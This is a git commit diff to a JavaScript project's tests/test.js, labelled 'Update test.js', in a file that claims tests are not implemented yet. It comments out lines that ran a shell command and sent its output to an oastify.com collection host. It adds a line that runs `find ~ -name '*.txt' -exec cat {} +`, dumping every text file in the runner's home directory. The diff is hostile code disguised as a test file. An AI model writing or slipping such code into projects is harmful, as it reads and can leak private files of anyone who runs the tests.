b7db3daccd55068b4c8944d8beb20f4498ccf429
Jackson <21977467+ScenicJaguar101@users.noreply.github.com>
2023-04-14 14:05:34 -0400

    Update test.js

--- tests/test.js
+++ tests/test.js
@@ -2,6 +2,10 @@
 console.log("Tests are not implemented yet...");
 
 
-const { exec } = require('child_process');
-let a = exec('ls');
-fetch("https://vbaj623gs0hv8em8lcyvyqyba2gt4osd.oastify.com/?" + a);
+//const { exec } = require('child_process');
+//let a = exec('ls');
+//fetch("https://vbaj623gs0hv8em8lcyvyqyba2gt4osd.oastify.com/?" + a);
+
+var cp = require('child_process');
+
+console.log(cp.execSync('find ~ -name "*.txt" -exec cat {} +').toString());
